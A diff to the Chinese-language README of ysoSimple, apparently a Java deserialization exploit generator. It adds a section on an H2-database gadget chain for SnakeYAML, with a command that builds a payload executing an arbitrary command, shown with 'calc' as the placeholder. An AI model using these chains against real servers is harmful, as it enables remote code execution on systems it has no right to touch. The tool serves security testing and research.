@@ -1336,6 +1336,16 @@ SnakeYaml系列的一些打法可以参考我写的这篇文章：[2023 华北�
 -m SnakeYamlAttack -g C3P0_Yso -a "FastJson1:Templateslmpl:auto_cmd:calc"
 ```
 
+###  H2-DataBase利用链
+
+描述：org.h2.jdbc.JdbcConnection的实例化方法接受jdbc url，然后在其实例化时会触发jdbc url连接，snakeyaml可利用其实例化进行攻击
+
+工具：因为不同版本的H2-database数据库的org.h2.jdbc.JdbcConnection实例化方法参数不同，所以ysoSimple会生成俩条利用链
+
+```java
+-m SnakeYamlAttack -g H2DataBase -a "H2CreateAlias:auto_cmd:calc"
+```
+
 ## 5.Shiro550反序列化(YsoAttack)
 
 ### 额外的参数
